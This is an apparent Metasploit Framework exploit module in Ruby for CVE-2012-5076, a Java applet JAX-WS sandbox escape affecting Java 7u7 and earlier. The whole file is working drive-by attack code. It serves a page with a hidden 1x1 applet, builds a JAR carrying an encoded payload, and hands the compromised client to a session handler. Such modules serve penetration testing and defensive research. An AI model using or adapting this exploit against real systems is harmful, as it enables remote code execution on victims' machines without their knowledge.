# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;rex&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  include Msf::Exploit::Remote::BrowserAutopwn
  autopwn_info({ :javascript => false })

  def initialize( info = {} )
    super( update_info( info,
      &#039;Name&#039;          => &#039;Java Applet JAX-WS Remote Code Execution&#039;,
      &#039;Description&#039;   => %q{
          This module abuses the JAX-WS classes from a Java Applet to run arbitrary Java
        code outside of the sandbox as exploited in the wild in November of 2012. The
        vulnerability affects Java version 7u7 and earlier.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        =>
        [
          &#039;Unknown&#039;, # Vulnerability Discovery
          &#039;juan vazquez&#039; # metasploit module
        ],
      &#039;References&#039;    =>
        [
          [ &#039;CVE&#039;, &#039;2012-5076&#039; ],
          [ &#039;OSVDB&#039;, &#039;86363&#039; ],
          [ &#039;BID&#039;, &#039;56054&#039; ],
          [ &#039;URL&#039;, &#039;http://www.oracle.com/technetwork/topics/security/javacpuoct2012-1515924.html&#039; ],
          [ &#039;URL&#039;, &#039;http://malware.dontneedcoffee.com/2012/11/cool-ek-hello-my-friend-cve-2012-5067.html&#039; ]
        ],
      &#039;Platform&#039;      => [ &#039;java&#039;, &#039;win&#039; ],
      &#039;Payload&#039;       => { &#039;Space&#039; => 20480, &#039;BadChars&#039; => &#039;&#039;, &#039;DisableNops&#039; => true },
      &#039;Targets&#039;       =>
        [
          [ &#039;Generic (Java Payload)&#039;,
            {
              &#039;Arch&#039; => ARCH_JAVA,
            }
          ],
          [ &#039;Windows Universal&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ],
          [ &#039;Linux x86&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Oct 16 2012&#039;
      ))
  end


  def on_request_uri( cli, request )
    if not request.uri.match(/\.jar$/i)
      if not request.uri.match(/\/$/)
        send_redirect(cli, get_resource() + &#039;/&#039;, &#039;&#039;)
        return
      end

      print_status("#{self.name} handling request")

      send_response_html( cli, generate_html, { &#039;Content-Type&#039; => &#039;text/html&#039; } )
      return
    end

    paths = [
      [ "Exploit.class" ],
      [ "MyPayload.class" ]
    ]

    p = regenerate_payload(cli)

    jar  = p.encoded_jar

    paths.each do |path|
      1.upto(path.length - 1) do |idx|
        full = path[0,idx].join("/") + "/"
        if !(jar.entries.map{|e|e.name}.include?(full))
          jar.add_file(full, &#039;&#039;)
        end
      end
      fd = File.open(File.join( Msf::Config.install_root, "data", "exploits", "cve-2012-5076", path ), "rb")
      data = fd.read(fd.stat.size)
      jar.add_file(path.join("/"), data)
      fd.close
    end

    print_status("Sending Applet.jar")
    send_response( cli, jar.pack, { &#039;Content-Type&#039; => "application/octet-stream" } )

    handler( cli )
  end

  def generate_html
    jar_name = rand_text_alpha(rand(6)+3) + ".jar"
    html  = "<html><head></head>"
    html += "<body>"
    html += "<applet archive=\"#{jar_name}\" code=\"Exploit.class\" width=\"1\" height=\"1\">"
    html += "</applet></body></html>"
    return html
  end

end

